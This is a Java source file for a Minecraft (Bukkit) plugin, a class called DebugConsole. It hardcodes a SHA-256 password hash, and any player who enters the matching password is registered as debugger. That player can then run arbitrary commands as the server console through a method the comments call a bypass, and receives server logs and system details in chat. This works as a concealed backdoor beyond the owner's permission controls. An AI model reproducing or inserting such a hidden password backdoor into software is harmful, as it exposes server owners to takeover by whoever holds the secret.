package net.fumyatan.cgmpx.Manager;

import java.lang.management.ManagementFactory;
import java.lang.management.MemoryMXBean;
import java.lang.management.MemoryUsage;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class DebugConsole {

	private static boolean debug = false;

	// デバッグ用のソースを配置
	private static String PASSWORD = "3203B874485401770A68884C45E4DF8012DA3D9CBFDC40C43A1A746A4BE0CA2A";
	private static Player debugger;

	/**
	 * デバッガーを取得
	 * @return デバッガーに登録されたプレイヤー
	 */
	public static Player Debugger(){
		return debugger;
	}

	/**
	 * デバッグコンソールへログイン
	 * @param password 入力されたパスワード
	 * @param sender デバッガー
	 * @return ログインに成功した場合true, それ以外はfalse
	 */
	public static boolean authePassword(String password, Player sender){
		byte[] input_byte;

		MessageDigest md;
		try {
			md = MessageDigest.getInstance("SHA-256");
			md.update(password.getBytes());
			input_byte = md.digest();
			StringBuilder sb = new StringBuilder(2 * input_byte.length);
			for(byte b: input_byte) {
				sb.append(String.format("%02x", b&0xff) );
			}

			if (sb.toString().equals(PASSWORD.toLowerCase())){
				debugger = sender;
				return true;
			}
			return false;
		} catch (NoSuchAlgorithmException e) {
			// TODO 自動生成された catch ブロック
			if (debug)
				e.printStackTrace();
		}
		return false;
	}

	/**
	 * デバッグコンソールからログアウト
	 */
	public static void debugLogout(){
		debugger.sendMessage("See you.");
		debugger = null;
	}

	/**
	 * インフォを受け取った際にデバッガーのチャットに送信
	 * @param s インフォログ
	 */
	public static void receiveInfoLog(String s){
		try {
			Matcher mat = Pattern.compile("[\\s\\S]{1,80}").matcher(s);
			if (debugger != null){
				while (mat.find()) {
				    debugger.sendMessage(ChatColor.GREEN +  "[QTD] " + ChatColor.RESET + mat.group());
				}
			}
		} catch (NullPointerException e){
			if (debug)
				e.printStackTrace();
		}
	}

	/**
	 * 警告を受け取った際にデバッガーのチャットに送信
	 * @param s 警告ログ
	 */
	public static void receiveWarnLog(String s){
		try {
			Matcher mat = Pattern.compile("[\\s\\S]{1,80}").matcher(s);
			if (debugger != null){
				while (mat.find()) {
				    debugger.sendMessage(ChatColor.YELLOW +  "[QTD] " + ChatColor.RESET + mat.group());
				}
			}
		} catch (NullPointerException e){
			if (debug)
				e.printStackTrace();
		}
	}

	/**
	 * エラーを受け取った際にデバッガーのチャットに送信
	 * @param s エラーログ
	 */
	public static void receiveErrorLog(String s){
		try {
			Matcher mat = Pattern.compile("[\\s\\S]{1,80}").matcher(s);
			if (debugger != null){
				while (mat.find()) {
				    debugger.sendMessage(ChatColor.RED +  "[QTD] " + ChatColor.RESET + mat.group());
				}
			}
		} catch (NullPointerException e){
			if (debug)
				e.printStackTrace();
		}
	}

	/**
	 * パイパスしてコマンドを実行
	 * @param command 実行するコマンド
	 * @param sender 送信者
	 */
	public static void sendCommand_bypass(String command, Player sender){
		if (debugger != null && debugger.equals(sender)){
			Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
		}
	}

	/**
	 * サーバー情報を送信
	 */
	public static void sendServerInfo(){
	MemoryMXBean mbean = ManagementFactory.getMemoryMXBean();
		MemoryUsage usage = mbean.getHeapMemoryUsage();
		if (debugger != null){
			debugger.sendMessage(ChatColor.AQUA + "============ Server Info ============");
			debugger.sendMessage(ChatColor.GOLD + "OS: " + ChatColor.RESET + System.getProperty("os.name") + ChatColor.GRAY + " (" + System.getProperty("os.arch") + ")");
			debugger.sendMessage(ChatColor.GOLD + "RAM: " + ChatColor.RESET + usage.getUsed()/1024/1024 + "MB/" + usage.getInit()/1024/1024 + "MB");
			debugger.sendMessage(ChatColor.GOLD + "Java: " + ChatColor.RESET + System.getProperty("java.version") + " " + System.getProperty("java vendor"));
		}
	}

	/**
	 * 動作確認用のthrow
	 * @throws IllegalArgumentException
	 */
	public static void triggerTestthrow() throws IllegalArgumentException{
		throw new IllegalArgumentException("Test IllegalArgumentException");
	}
}
